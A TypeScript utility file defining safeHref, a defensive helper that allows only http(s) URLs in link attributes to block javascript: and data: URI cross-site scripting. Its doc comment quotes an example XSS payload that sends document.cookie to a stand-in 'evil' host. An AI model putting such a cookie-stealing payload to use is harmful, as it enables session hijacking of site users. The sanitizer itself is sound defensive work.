/**
 * Guard external-link `href` values against `javascript:`/`data:` URI XSS.
 *
 * Many link targets here come from user input or AI/web-search hydration (college websites,
 * scholarship application URLs, campus-visit links). React does NOT sanitize URL attributes,
 * so a stored value like `javascript:fetch('//evil/?c='+document.cookie)` would execute on
 * click. `safeHref` returns the URL only when it parses to an http(s) URL, else `undefined`
 * (an anchor with no `href` is rendered inert, not clickable).
 */
export function safeHref(url: string | null | undefined): string | undefined {
  if (!url) return undefined;
  const trimmed = url.trim();
  try {
    // Parse as an absolute URL (these link fields are always absolute external URLs). A
    // `javascript:`/`data:` URI parses with a non-http(s) protocol and is rejected; a
    // relative or protocol-relative value fails to parse and is also rejected.
    const parsed = new URL(trimmed);
    return parsed.protocol === "http:" || parsed.protocol === "https:" ? trimmed : undefined;
  } catch {
    return undefined;
  }
}
